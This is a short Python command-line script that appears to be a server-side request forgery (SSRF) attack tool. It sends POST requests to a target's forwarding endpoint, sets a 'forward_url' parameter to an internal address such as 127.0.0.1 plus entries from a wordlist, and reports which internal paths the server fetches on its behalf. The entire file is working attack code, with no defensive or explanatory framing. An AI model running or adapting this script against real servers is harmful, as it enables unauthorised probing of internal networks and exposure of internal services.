import argparse
import requests
import time


def api_request(urltarget, dynamic_section, wordlist_f, ms, internal):
    index = 1
    listing = open(wordlist_f, "r")
    for word in listing:
        if word[0] == '#' or word[0] == '\n':
            continue
        response = requests.post(urltarget + dynamic_section + str(index), params={
            "forward_url": internal + word.rstrip(), "proxy_response": "true", "insecure_tls": "false",
            "expand_path": "true", "capacity": "1000"
        })
        print(response.request.url)
        print(response.request.body)
        print(response.status_code)
        if response.status_code == 200:
            print("Execute internal request")
        time.sleep(ms / 1000.0)
        index += 1
    listing.close()


def parse_it():
    parser = argparse.ArgumentParser(description='Wordlist, url_link, ms')
    parser.add_argument('-w', type=str, help='Wordlist file')
    parser.add_argument('-target', type=str,
                        help='The static section of the url EX:) ~>http://target.com/<~your_created_link')
    parser.add_argument('-dynamic', type=str,
                        help='The dynamic section of the url EX:) http://target.com/~>your_created_link<~')
    parser.add_argument('-m', type=int, help='ms per request')
    parser.add_argument('-internal_target', type=str,
                        help='The internal web server address EX:) http://127.0.0.1/path/leading/to/search/')
    args = parser.parse_args()
    return args.w, args.target, args.dynamic, args.m, args.internal_target


if __name__ == '__main__':
    wordlist, target, dynamic, ms, internal_target = parse_it()
    api_request(target, dynamic, wordlist, ms, internal_target)
